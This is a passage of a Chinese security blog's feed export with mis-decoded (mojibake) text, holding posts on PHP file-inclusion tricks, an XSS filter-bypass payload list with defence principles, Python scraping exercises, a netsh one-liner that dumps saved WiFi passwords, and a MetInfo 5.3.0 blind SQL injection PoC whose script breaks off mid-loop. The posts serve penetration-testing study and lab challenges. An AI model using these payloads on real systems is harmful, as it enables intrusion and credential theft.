<p>6.æ‰“å¼€webæœåŠ¡å™¨çš„dataç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæ–‡ä»¶å·²ç»æˆåŠŸçš„å†™åˆ°äº†webæœåŠ¡å™¨ä¸­ã€‚DedeCMS-5.7-UTF8-SP1\uploads</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_15.png" alt=""></p>
<p>7.æˆ‘ä»¬è®¿é—®ä¸€ä¸‹</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_16.png" alt=""></p>
<p>8.æ¼æ´åˆ©ç”¨æˆåŠŸ</p>
<h1 id="0x06-æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨æŠ€å·§"><a href="#0x06-æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨æŠ€å·§" class="headerlink" title="0x06 æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨æŠ€å·§"></a>0x06 æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨æŠ€å·§</h1><p>è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ä¹‹æ‰€ä»¥èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œå°±æ˜¯å› ä¸ºæ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰è¢«åŒ…å«çš„æ–‡ä»¶å†…å®¹ã€‚å› æ­¤ï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´è¦æƒ³æ‰§è¡Œå‘½ä»¤ï¼Œä¹Ÿéœ€è¦æ‰¾ä¸€ä¸ªæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶å†…å®¹çš„æœ¬åœ°æ–‡ä»¶ã€‚</p>
<p>ç›®å‰ä¸»è¦æœ‰å‡ ä¸‹å‡ ç§å¸¸è§çš„æŠ€å·§ï¼š</p>
<h3 id="0x06-1-PHPåŒ…å«è¯»æ–‡ä»¶"><a href="#0x06-1-PHPåŒ…å«è¯»æ–‡ä»¶" class="headerlink" title="0x06_1 PHPåŒ…å«è¯»æ–‡ä»¶"></a>0x06_1 PHPåŒ…å«è¯»æ–‡ä»¶</h3><blockquote>
<p>php://filter/read=convert.base64-encode/resource=login.php</p>
</blockquote>
<h3 id="0x06-2-PHPåŒ…å«å†™æ–‡ä»¶"><a href="#0x06-2-PHPåŒ…å«å†™æ–‡ä»¶" class="headerlink" title="0x06_2 PHPåŒ…å«å†™æ–‡ä»¶"></a>0x06_2 PHPåŒ…å«å†™æ–‡ä»¶</h3><p>åŒ…å«data://æˆ–php://inputç­‰ä¼ªåè®®ã€‚è¿™éœ€è¦ç›®æ ‡æœåŠ¡å™¨æ”¯æŒï¼ŒåŒæ—¶è¦æ±‚allow_url_fopenä¸ºè®¾ç½®ä¸ºONã€‚</p>
<pre><code>http://ip_address/?page=php://input
å¹¶ä¸”POSTæ•°æ®ä¸º&lt;?php system(&apos;net user&apos;);?&gt;
</code></pre><h3 id="0x06-3-åŒ…å«æ—¥å¿—æ–‡ä»¶"><a href="#0x06-3-åŒ…å«æ—¥å¿—æ–‡ä»¶" class="headerlink" title="0x06_3 åŒ…å«æ—¥å¿—æ–‡ä»¶"></a>0x06_3 åŒ…å«æ—¥å¿—æ–‡ä»¶</h3><p>å½“æŸä¸ªPHPæ–‡ä»¶å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå´æ— æ³•ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œè¿™å°±æ„å‘³ç€æœ‰åŒ…å«æ¼æ´å´ä¸èƒ½æ‹¿æ¥åˆ©ç”¨ï¼Œè¿™æ—¶å°±å¯ä»¥åˆ©ç”¨apacheæ—¥å¿—æ–‡ä»¶æ¥å…¥ä¾µ</p>
<p>ApacheæœåŠ¡å™¨è¿è¡Œåä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œaccess.logï¼ˆè®¿é—®æ—¥å¿—ï¼‰å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼Œapacheä¼šè®°å½•ä¸‹æˆ‘ä»¬çš„æ“ä½œï¼Œå¹¶å†™å…¥åˆ°è®¿é—®æ—¥å¿—access.logä¹‹ä¸­ã€‚</p>
<p>è®¿é—®</p>
<blockquote>
<p><a href="http://ip_address/?page=../../../../Apache-20/logs/access.log" target="_blank" rel="external">http://ip_address/?page=../../../../Apache-20/logs/access.log</a></p>
</blockquote>
<h3 id="0x06-4-æˆªæ–­åŒ…å«"><a href="#0x06-4-æˆªæ–­åŒ…å«" class="headerlink" title="0x06_4 æˆªæ–­åŒ…å«"></a>0x06_4 æˆªæ–­åŒ…å«</h3><p>åªé€‚åˆäºmagic_quotes_gpc=offçš„æ—¶å€™ã€‚</p>
<blockquote>
<p>hhtp://ip_address/?page=1.jpg%00</p>
</blockquote>
<h3 id="0x06-5-PHPå†…ç½®åè®®"><a href="#0x06-5-PHPå†…ç½®åè®®" class="headerlink" title="0x06_5 PHPå†…ç½®åè®®"></a>0x06_5 PHPå†…ç½®åè®®</h3><pre><code>file:///var/www/html  è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ
ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt;   è®¿é—®FTP(s) URLs
data://  æ•°æ®æµ
http:// â€” è®¿é—® HTTP(s) URLs
ftp:// â€” è®¿é—® FTP(s) URLs
php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµ
zlib:// â€” å‹ç¼©æµ
data:// â€” Data (RFC 2397)
glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼
phar:// â€” PHP Archive
ssh2:// â€” Secure Shell 2
rar:// â€” RAR
ogg:// â€” Audio streams
expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ
</code></pre><h3 id="0x06-6-åŒ…å«Sessionæ–‡ä»¶ã€‚"><a href="#0x06-6-åŒ…å«Sessionæ–‡ä»¶ã€‚" class="headerlink" title="0x06_6 åŒ…å«Sessionæ–‡ä»¶ã€‚"></a>0x06_6 åŒ…å«Sessionæ–‡ä»¶ã€‚</h3><p>è¿™éƒ¨åˆ†éœ€è¦æ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶éƒ¨åˆ†Sessionæ–‡ä»¶çš„å†…å®¹ï¼ŒPHPé»˜è®¤ç”Ÿæˆçš„Sessionæ–‡ä»¶ä¸€èˆ¬å­˜æ”¾åœ¨/tmpç›®å½•ä¸‹ã€‚</p>
<h3 id="0x06-7-åŒ…å«-proc-self-environæ–‡ä»¶ã€‚"><a href="#0x06-7-åŒ…å«-proc-self-environæ–‡ä»¶ã€‚" class="headerlink" title="0x06_7 åŒ…å«/proc/self/environæ–‡ä»¶ã€‚"></a>0x06_7 åŒ…å«/proc/self/environæ–‡ä»¶ã€‚</h3><blockquote>
<p><a href="http://192.168.159.128/index.php?file=../../../../../../../proc/self/environ" target="_blank" rel="external">http://192.168.159.128/index.php?file=../../../../../../../proc/self/environ</a></p>
</blockquote>
<p>è¿™ä¸ªä¹Ÿæ˜¯ä¸€ç§é€šç”¨çš„æŠ€å·§ï¼Œå› ä¸ºå®ƒæ ¹æœ¬ä¸éœ€è¦çŒœæµ‹è¢«åŒ…å«æ–‡ä»¶çš„è·¯å¾„ï¼ŒåŒæ—¶ç”¨æˆ·ä¹Ÿèƒ½æ§åˆ¶å®ƒçš„å†…å®¹ï¼Œå¸¸è§çš„åšæ³•æ˜¯å‘User-Agentä¸­æ³¨å…¥PHPä»£ç æ¥å®Œæˆæ”»å‡»ã€‚</p>
<h2 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h2><p>å¼ºåŠ›æ¨èä¸€ç¯‡æ–‡ç« ï¼š<a href="http://www.cnblogs.com/littlehann/p/3665062.html" target="_blank" rel="external">LFIã€RFIã€PHPå°è£…åè®®å®‰å…¨é—®é¢˜å­¦ä¹ </a></p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> PHP </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XSSç»•è¿‡ä¸é˜²å¾¡æ€»ç»“]]></title>
      <url>/2016/07/18/XSS%E7%BB%95%E8%BF%87%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>è·¨ç«™è„šæœ¬æ”»å‡»(Cross Site Scripting)ï¼Œä¸ºä¸å’Œå±‚å æ ·å¼è¡¨(Cascading Style Sheets, CSS)çš„ç¼©å†™æ··æ·†ï¼Œæ•…å°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸ºXSSã€‚æ¶æ„æ”»å‡»è€…å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„Scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç‰¹æ®Šç›®çš„ã€‚</p>
<a id="more"></a>
<h1 id="0x01-XSSçš„åˆ†ç±»"><a href="#0x01-XSSçš„åˆ†ç±»" class="headerlink" title="0x01 XSSçš„åˆ†ç±»"></a>0x01 XSSçš„åˆ†ç±»</h1><ul>
<li>åå°„å‹ï¼ˆéæŒä¹…å‹ï¼‰</li>
<li>å­˜å‚¨å‹ï¼ˆæŒä¹…å‹ï¼‰</li>
<li>DOMå‹</li>
</ul>
<p>å…·ä½“çš„ä¸€äº›ä»‹ç»ä¸ç®€å•çš„å®ä¾‹å°±ä¸åšè¯¦è¿°äº†ï¼Œæœ¬æ–‡ä¸»è¦ä»‹ç»çš„æ˜¯XSSçš„ç»•è¿‡æŠ€å·§ä¸é˜²å¾¡ã€‚</p>
<h1 id="0x02-XSSçš„ç»•è¿‡"><a href="#0x02-XSSçš„ç»•è¿‡" class="headerlink" title="0x02 XSSçš„ç»•è¿‡"></a>0x02 XSSçš„ç»•è¿‡</h1><h3 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h3><pre><code>&lt;ScRIpT&gt;alert(&apos;123&apos;)&lt;/sCRIpT&gt;
</code></pre><h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><pre><code>1.åå…­è¿›åˆ¶ç¼–ç 

2.jsfuckç¼–ç 

3.urlç¼–ç 

4.unicodeç¼–ç 

    &lt;0x736372697074&gt;alert(&apos;123&apos;)&lt;/0x736372697074&gt;
    &lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt; 
    &apos;è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥å°†&apos;å†™ä¸º &amp;#x27
    å°†&quot;/&quot;è½¬ä¹‰ä¸º&quot;&amp;sol;&quot;
</code></pre><h3 id="ç»•è¿‡magic-quotes-gpc"><a href="#ç»•è¿‡magic-quotes-gpc" class="headerlink" title="ç»•è¿‡magic_quotes_gpc"></a>ç»•è¿‡magic_quotes_gpc</h3><pre><code>&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt; 
</code></pre><h3 id="é—­åˆæ ‡ç­¾"><a href="#é—­åˆæ ‡ç­¾" class="headerlink" title="é—­åˆæ ‡ç­¾"></a>é—­åˆæ ‡ç­¾</h3><pre><code>&quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt;

&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; 
</code></pre><h3 id="æ ‡ç­¾ç»•è¿‡"><a href="#æ ‡ç­¾ç»•è¿‡" class="headerlink" title="æ ‡ç­¾ç»•è¿‡"></a>æ ‡ç­¾ç»•è¿‡</h3><pre><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;
&lt;button onclick=&quot;javascript:alert(&apos;xss&apos;)&gt;XSS&lt;/button&quot;&gt;
&lt;title&gt;&lt;img a=&quot;&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//&quot;&gt;
&quot;onsubmit=javascript:alert(1)%20name=&quot;a
</code></pre><h3 id="å…¶ä»–ç¬¦å·ç»•è¿‡"><a href="#å…¶ä»–ç¬¦å·ç»•è¿‡" class="headerlink" title="å…¶ä»–ç¬¦å·ç»•è¿‡"></a>å…¶ä»–ç¬¦å·ç»•è¿‡</h3><pre><code>%0aalert(1);   %0a  æ¢è¡Œç¬¦
/**/            æ›¿æ¢ç©ºæ ¼
%00                æˆªæ–­
</code></pre><h3 id="åŒå­—æ¯ç»•è¿‡"><a href="#åŒå­—æ¯ç»•è¿‡" class="headerlink" title="åŒå­—æ¯ç»•è¿‡"></a>åŒå­—æ¯ç»•è¿‡</h3><pre><code>&lt;img ononerrorerror=&quot;123&quot;&gt;
&lt;script&gt;alalertert(123)&lt;/script&gt;
</code></pre><h3 id="å®½å­—èŠ‚ç»•è¿‡"><a href="#å®½å­—èŠ‚ç»•è¿‡" class="headerlink" title="å®½å­—èŠ‚ç»•è¿‡"></a>å®½å­—èŠ‚ç»•è¿‡</h3><pre><code>gbxxxxç³»åˆ—çš„ç¼–ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°è¯•ä¸€ä¸‹å®½å­—èŠ‚  %c0 %bf  %5c
</code></pre><h3 id="å…¶ä»–äº‹ä»¶ç»•è¿‡"><a href="#å…¶ä»–äº‹ä»¶ç»•è¿‡" class="headerlink" title="å…¶ä»–äº‹ä»¶ç»•è¿‡"></a>å…¶ä»–äº‹ä»¶ç»•è¿‡</h3><pre><code>onload
onclick
onerror
prompt
confirm
onmousemove
</code></pre><h3 id="CRLF-injectionç»•è¿‡"><a href="#CRLF-injectionç»•è¿‡" class="headerlink" title="CRLF injectionç»•è¿‡"></a>CRLF injectionç»•è¿‡</h3><pre><code>CRLFæ˜¯â€å›è½¦ + æ¢è¡Œâ€ï¼ˆ\r\nï¼‰çš„ç®€ç§°ã€‚
http://www.xxx.com%0d%0a%0d%0a+xssä»£ç 

&lt;svg/onload=prompt(1)&gt;
</code></pre><h1 id="0x03-XSSçš„é˜²å¾¡"><a href="#0x03-XSSçš„é˜²å¾¡" class="headerlink" title="0x03 XSSçš„é˜²å¾¡"></a>0x03 XSSçš„é˜²å¾¡</h1><ul>
<li><p>åŸåˆ™1ï¼šâ€œSecure By Defaultâ€åŸåˆ™ï¼šä¸è¦å¾€HTMLé¡µé¢ä¸­æ’å…¥ä»»ä½•ä¸å¯ä¿¡æ•°æ®</p>
</li>
<li><p>åŸåˆ™2ï¼šåœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTMLæ ‡ç­¾ä¹‹é—´æ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒHTML Entityç¼–ç </p>
</li>
<li><p>åŸåˆ™3ï¼šåœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTMLå±æ€§é‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒHTMLå±æ€§ç¼–ç </p>
</li>
<li><p>åŸåˆ™4ï¼šåœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°SCRIPTé‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒSCRIPTç¼–ç </p>
</li>
<li><p>åŸåˆ™5ï¼šåœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°Styleå±æ€§é‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒCSSç¼–ç </p>
</li>
<li><p>åŸåˆ™6ï¼šåœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTML URLé‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒURLç¼–ç </p>
</li>
<li><p>åŸåˆ™7ï¼šä½¿ç”¨å¯Œæ–‡æœ¬æ—¶ï¼Œä½¿ç”¨XSSè§„åˆ™å¼•æ“è¿›è¡Œç¼–ç è¿‡æ»¤</p>
</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> CRLF </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> XSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pythonç»ƒä¹ é¢˜]]></title>
      <url>/2016/07/16/python%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>ä¸¤ä¸ªpythonç»ƒä¹ çš„å°è„šæœ¬ï¼Œæ¶‰åŠæ­£åˆ™è¡¨è¾¾å¼ï¼Œç½‘é¡µçˆ¬è™«åŠä¿¡æ¯æå–ã€‚<br><a id="more"></a></p>
<h1 id="ä¹ é¢˜1ï¼šä»æ–‡æœ¬ä¸­åŒ¹é…è‹±æ–‡å•è¯"><a href="#ä¹ é¢˜1ï¼šä»æ–‡æœ¬ä¸­åŒ¹é…è‹±æ–‡å•è¯" class="headerlink" title="ä¹ é¢˜1ï¼šä»æ–‡æœ¬ä¸­åŒ¹é…è‹±æ–‡å•è¯"></a>ä¹ é¢˜1ï¼šä»æ–‡æœ¬ä¸­åŒ¹é…è‹±æ–‡å•è¯</h1><p>ä»£ç ï¼š</p>
<pre><code>#!usr/bin/python
#coding=utf-8
&apos;&apos;&apos;
@authorï¼šw2n1ck

&apos;&apos;&apos;
import re
#è½½å…¥æ­£åˆ™è¡¨è¾¾å¼æ¨¡å—
f1 = open(&apos;from.txt&apos;)
data = f1.read()
f1.close()
#æ‰“å¼€æ–‡ä»¶ï¼Œè¯»å…¥æ–‡æœ¬
result = re.findall(&apos;[A-z]+&apos;, data)
#ç”¨æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„findallæ–¹æ³•
#æ‰¾å‡ºdataä¸­æ‰€æœ‰ä»A-Za-zçš„è¿ç»­å­—ç¬¦
result.sort()
#æŠŠå¾—åˆ°çš„ç»“æœå­—ç¬¦ä¸²listæ’åºï¼Œé»˜è®¤ä¸ºå­—å…¸åº
data = &apos;\n&apos;.join(result)
#æŠŠæ’åºåçš„ç»“æœç”¨æ¢è¡Œç¬¦è¿æ¥æˆä¸€æ®µæ–‡æœ¬
f2 = open(&apos;to.txt&apos;, &apos;w&apos;)
f2.write(data)
f2.close()
#è¾“å‡ºåˆ°æ–‡ä»¶ä¸­
</code></pre><p><code>from.txt</code>å†…å®¹å¦‚ä¸‹ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E4%BB%8E%E6%96%87%E6%9C%AC%E4%B8%AD%E5%8C%B9%E9%85%8D%E5%8D%95%E8%AF%8D_1.png" alt=""></p>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E4%BB%8E%E6%96%87%E6%9C%AC%E4%B8%AD%E5%8C%B9%E9%85%8D%E5%8D%95%E8%AF%8D_2.png" alt=""></p>
<h1 id="ä¹ é¢˜2ï¼š-æŸ¥è¯¢çƒ­æ˜ ç”µå½±"><a href="#ä¹ é¢˜2ï¼š-æŸ¥è¯¢çƒ­æ˜ ç”µå½±" class="headerlink" title="ä¹ é¢˜2ï¼š æŸ¥è¯¢çƒ­æ˜ ç”µå½±"></a>ä¹ é¢˜2ï¼š æŸ¥è¯¢çƒ­æ˜ ç”µå½±</h1><p>æŸ¥è¯¢å½“å‰æ­£åœ¨çƒ­æ˜ çš„ç”µå½±ã€‚æ–¹æ³•æ˜¯ï¼Œæ‰¾ä¸€ä¸ªç”µå½±ç½‘ç«™ï¼ˆè±†ç“£ç”µå½±ã€æ—¶å…‰ç½‘ã€æ ¼ç“¦æ‹‰ç­‰ç­‰ï¼‰ï¼ŒæŠŠå®ƒçš„é¦–é¡µå–è¿‡æ¥ï¼Œåˆ†æä¸€ä¸‹ç½‘é¡µå†…å®¹çš„ç»“æ„ï¼Œç„¶åä»ä¸­å–å‡ºä½ è¦çš„ä¿¡æ¯ã€‚</p>
<p>å› ä¸ºä¸€ä¸ªç½‘é¡µä¸Šä¼šåŒ…å«å¾ˆå¤šå†…å®¹ï¼Œå¦‚ä½•æŸ¥æ‰¾å®šä½åˆ°ä½ æ‰€éœ€çš„å†…å®¹ï¼Œè¿˜æ˜¯è¦è´¹ç‚¹åŠŸå¤«çš„ã€‚ä½ å¯èƒ½ä¼šç”¨åˆ°æ­£åˆ™è¡¨è¾¾å¼ã€urllibï¼Œæˆ–è€…BeautifulSoupä¹‹ç±»çš„ã€‚</p>
<p>é¦–å…ˆå®‰è£…ç¬¬ä¸‰æ–¹çš„ç½‘é¡µåˆ†ææ¨¡å—ï¼š<code>BeautifulSoup</code></p>
<p>ä»£ç ï¼š</p>
<pre><code>#!usr/bin/python
#coding:utf-8
&apos;&apos;&apos;
@authorï¼šw2n1ck

&apos;&apos;&apos;
import urllib2
from bs4 import BeautifulSoup
print &quot;è±†ç“£æ­£åœ¨çƒ­æ˜ ï¼š&quot;
url = &quot;http://movie.douban.com&quot;
html = urllib2.urlopen(url).read()
soup = BeautifulSoup(html)
div_hot = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;screening&quot;})
for i in div_hot.find_all(&apos;li&apos;, class_=&apos;title&apos;):
    movie_title = i.a.get_text()
#   movie_title = movie_title.strip() #å»é™¤movie_titleä¸¤è¾¹çš„ç©ºæ ¼
    print movie_title

print &quot;\nè±†ç“£è¿‘æœŸçƒ­é—¨ï¼š&quot;
div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;hot-gallery&quot;})
for i in div_new.find_all(&apos;li&apos;, class_=&apos;title&apos;):
    movie_new = i.a.get_text()
    print movie_new
</code></pre><p>ä»£ç è§£æï¼š</p>
<ul>
<li><p>7ã€8è¡Œåˆ†åˆ«å¯¼å…¥äº†urllib2ã€beautifulsoupæ¨¡å—</p>
</li>
<li><p>11è¡Œç”¨urllibæ¨¡å—æŠŠè±†ç“£çš„ç½‘é¡µæŠ“ä¸‹æ¥</p>
</li>
<li><p>12è¡Œç”¨BeautifulSoupæ¨¡å—æ•´ç†æŠ“ä¸‹æ¥çš„htmlå†…å®¹</p>
</li>
<li><p>13è¡Œæ˜¯é‡ç‚¹ï¼ŒæŠŠæˆ‘ä»¬éœ€è¦çš„é‚£ä¸€éƒ¨åˆ†divæˆªå–ä¸‹æ¥ï¼ˆid=â€screeningâ€çš„é‚£éƒ¨åˆ†ï¼‰ï¼Œéœ€è¦åˆ†æhtmlæºç ã€‚</p>
</li>
<li><p>æ¥ä¸‹æ¥åœ¨ä¸Šæ–‡çš„divä¸­ï¼Œå¯»æ‰¾æ‰€æœ‰ class=â€titleâ€ çš„ li å…ƒç´ ï¼Œæ³¨æ„ï¼Œç”±äº <code>class_</code>æ˜¯pythonä¸­çš„ä¿ç•™å…³é”®å­—ï¼Œæ‰€ä»¥éœ€è¦ <code>class_=&#39;title&#39;</code>ã€‚</p>
</li>
<li><p>æœ‰äº›ç½‘é¡µæŠ“å–å‡ºæ¥çš„å†…å®¹å‰åæœ‰å¾ˆå¤šç©ºæ ¼ï¼Œå¯ä»¥ç”¨.strip() å»é™¤ã€‚</p>
</li>
</ul>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E6%9F%A5%E6%89%BE%E7%83%AD%E9%97%A8%E7%94%B5%E5%BD%B1.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> çˆ¬è™« </tag>
            
            <tag> Python </tag>
            
            <tag> æ­£åˆ™è¡¨è¾¾å¼ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CMDå‘½ä»¤è·å–ç”µè„‘æ‰€æœ‰è¿æ¥è¿‡çš„WiFiå¯†ç ]]></title>
      <url>/2016/07/16/CMD%E5%91%BD%E4%BB%A4%E8%8E%B7%E5%8F%96%E7%94%B5%E8%84%91%E6%89%80%E6%9C%89%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%9A%84WiFi%E5%AF%86%E7%A0%81/</url>
      <content type="html"><![CDATA[<p>CMDå¹³å¸¸äººçœ‹èµ·ä¾†æ ¹æœ¬æ²¡ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯å¦‚æœä½ ä¼šä½¿ç”¨ï¼Œä½ ä¼šå‘ç°ï¼šå®ƒçœŸçš„å¾ˆå¼ºå¤§ï¼<br><a id="more"></a></p>
<p>Windows 7ã€Windows 8ã€Windows 8.1ã€Windows 10å·²æµ‹è¯•æˆåŠŸï¼ï¼ˆwindows 7ä¸‹ä»¥ç®¡ç†å‘˜æ–¹å¼è¿è¡Œï¼‰</p>
<h1 id="ä½¿ç”¨æ–¹æ³•ï¼š"><a href="#ä½¿ç”¨æ–¹æ³•ï¼š" class="headerlink" title="ä½¿ç”¨æ–¹æ³•ï¼š"></a>ä½¿ç”¨æ–¹æ³•ï¼š</h1><p>ä¸€ã€ä»¥ç®¡ç†å‘˜æƒé™è¿è¡ŒCMD ï¼ˆä»¥åŠ å¼€å¯æ— çº¿ç½‘å¡ã€æœ€å¥½æ˜¯ç¬”è®°æœ¬ï¼‰</p>
<p>äºŒã€è¾“å…¥å‘½ä»¤ï¼š</p>
<blockquote>
<p> for /f â€œskip=9 tokens=1,2 delims=:â€ %i in (â€˜netsh wlan show profilesâ€™) do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</p>
</blockquote>
<p>ä¸‰ã€ç„¶åCMDå°±åˆ—å‡ºå¾ˆå¤šè¡Œ ä½ ä»¥å‰è¿æ¥è¿‡çš„wifiä¿¡æ¯ã€åŠ å¯†æ–¹å¼ã€åŒ…æ‹¬å¯†ç </p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/WIFI%E5%AF%86%E7%A0%81.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> çˆ†ç ´ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å®éªŒå§ç»¼åˆæ¸—é€_metinfo_ç›²æ³¨è„šæœ¬]]></title>
      <url>/2016/07/14/%E5%AE%9E%E9%AA%8C%E5%90%A7%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F-metinfo-%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<p>MetInfo5.3.0 ç‰ˆæœ¬SQLæ³¨å…¥ã€‚åœ¨æœ¬åœ°æ­å»ºç¯å¢ƒï¼Œåˆ†æå¦‚ä¸‹:</p>
<p>è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯listmod.phpï¼Œä»£ç çš„æœ€åä¸€è¡Œ<code>$serch_sql</code> æ€ä¹ˆåšèƒ½è®©è¿™ä¸ªæ²¡æœ‰åœ¨ä¸Šé¢ç»™åˆå§‹åŒ–ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¦åšçš„ã€‚<br><a id="more"></a></p>
<p>é€šè¿‡è°ƒè¯•ï¼š</p>
<p>æˆ‘ä»¬çš„çŸ¥ æ§åˆ¶å®ƒæ˜¯å¦åˆå§‹åŒ–çš„å¦ä¸€ä¸ªå˜é‡ä¸ºimgproduct</p>
<p>å½“è¿™ä¸ªå˜é‡ésearchçš„ä»»æ„å­—ç¬¦çš„æ—¶å€™ï¼Œå¯¼è‡´serch_sql ä¸èƒ½è¿›è¡Œåˆå§‹åŒ–</p>
<p><strong>æ„é€ POCï¼š</strong></p>
<blockquote>
<p><a href="http://localhost/MetInfo5.3/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=as" target="_blank" rel="external">http://localhost/MetInfo5.3/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=as</a> a join met_admin_table as b where if(ascii(substr(b.admin_id,1,1))=97,1,0) limit 0,1â€“ sd&amp;imgproduct=xxxx</p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/metinfo_Blind_Injection_1.png" alt=""></p>
<p>è¿™æ ·ä¸€æ¥ æ¯”sqlæ³¨å…¥æ›´ä¸ºç®€å•äº†97é‚£ä¸ªä½ç½®ï¼Œç„¶ååœ¨åˆ¤æ–­ç¬¬äºŒä½ï¼Œå†ç©·èš,è‡ªç„¶å°±çˆ†è¡¨äº†ã€‚</p>
<h1 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h1><p>å®éªŒå§ç»¼åˆæ¸—é€metinfoã€‚</p>
<p>æœ¬é¢˜ç¯å¢ƒå°±æ˜¯è¿™ä¸ªï¼Œæ ¹æ®POCå†™å¦‚ä¸‹è„šæœ¬ï¼š</p>
<pre><code># -*- coding: utf8 -*-
import httplib
import requests
import urllib
import string

payloads = &apos;abcdefghijklmnopqrstuvwxyz0123456789&apos;

url=&quot;http://localhost:8080/MetInfo_v5.3.0/&quot;

password = &apos;&apos;

for p in range(1, 33):

    for num in payloads:

        num = ord(num)

